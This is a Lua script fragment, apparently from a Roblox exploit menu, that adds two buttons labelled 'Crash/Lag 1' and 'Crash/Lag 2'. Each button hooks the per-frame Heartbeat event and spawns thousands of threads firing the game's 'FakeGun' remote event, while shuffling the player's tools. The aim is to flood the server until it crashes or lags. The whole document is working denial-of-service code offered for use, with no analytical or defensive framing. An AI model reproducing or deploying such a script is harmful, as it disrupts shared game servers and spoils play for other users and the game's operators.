Main2:addButton("Crash/Lag 1",function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")

	local totalRequests = 4000
	local maxIterations = 20
	local currentIteration = 0

	local function sendRequests()
		for i = 1, totalRequests do
			spawn(function()
				local args = {
					[1] = true
				}
				ReplicatedStorage.Remotes.Gameplay.FakeGun:FireServer(unpack(args))

				currentIteration = currentIteration + 1
				if currentIteration >= maxIterations then
					currentIteration = 0
					local character = Players.LocalPlayer.Character
					if character then
						for _, child in ipairs(character:GetChildren()) do
							if child:IsA("Tool") then
								child.Parent = nil
							end
						end
					end
				end

				if i == totalRequests then
					local character = Players.LocalPlayer.Character
					if character then
						for _, child in ipairs(character:GetChildren()) do
							if child:IsA("Tool") then
								child.Parent = character
							end
						end
					end
				end
			end)
		end
	end

	RunService.Heartbeat:Connect(sendRequests)
end)

Main2:addButton("Crash/Lag 2",function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")

	local totalRequests = 4000
	local maxIterations = 20
	local currentIteration = 0

	local function moveToolsToBackpack(character)
		local backpack = Players.LocalPlayer.Backpack
		if character and backpack then
			for _, child in ipairs(character:GetChildren()) do
				if child:IsA("Tool") then
					child.Parent = backpack
				end
			end
		end
	end

	local function sendRequests()
		for i = 1, totalRequests do
			spawn(function()
				local args = {
					[1] = true
				}
				ReplicatedStorage.Remotes.Gameplay.FakeGun:FireServer(unpack(args))

				currentIteration = currentIteration + 1
				if currentIteration >= maxIterations then
					currentIteration = 0
					local character = Players.LocalPlayer.Character
					moveToolsToBackpack(character)
				end

				if i == totalRequests then
					local character = Players.LocalPlayer.Character
					moveToolsToBackpack(character)
				end
			end)
		end
	end

	RunService.Heartbeat:Connect(sendRequests)
end)

